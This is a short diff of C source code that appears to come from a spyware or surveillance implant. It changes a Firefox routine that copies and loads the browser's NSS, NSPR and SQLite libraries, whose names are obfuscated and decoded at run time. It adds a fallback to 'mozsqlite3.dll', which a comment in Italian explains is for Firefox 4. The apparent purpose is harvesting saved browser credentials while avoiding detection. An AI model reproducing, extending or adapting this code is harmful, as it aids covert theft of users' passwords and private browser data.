@@ -61,6 +61,7 @@ typedef enum SECStatus
 #define PLC_LIBRARY_NAME   "Pypx.Xyy" //"plc4.dll"
 #define NSPR_LIBRARY_NAME  "19PEx.Xyy" //"nspr4.dll"
 #define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"
+#define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
 #define MOZCRT_LIBRARY_NAME  "05OpELYN.Xyy" //"mozcrt19.dll"
 #define NSSU_LIBRARY_NAME  "199VLZyn.Xyy" //"nssutil3.dll"
 #define PLDS_LIBRARY_NAME  "PyX9x.Xyy" //"plds4.dll"
@@ -272,8 +273,13 @@ void FireFoxInitFunc()
 			swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITE_LIBRARY_NAME));
 			HM_CompletePath(DeobStringA(SQLITE_LIBRARY_NAME), destPath);
 			libsql = CopyAndLoadDLL(loadPath, destPath);
-			if (!libsql)
-				return;
+			if (!libsql) { // Su FireFox4 la libreria si chiama diversamente
+				swprintf_s(loadPath, MAX_PATH, L"%s\\%S", firefoxDir, DeobStringA(SQLITEALT_LIBRARY_NAME));
+				HM_CompletePath(DeobStringA(SQLITEALT_LIBRARY_NAME), destPath);
+				libsql = CopyAndLoadDLL(loadPath, destPath);
+				if (!libsql)
+					return;
+			}
 		}
 	}
 
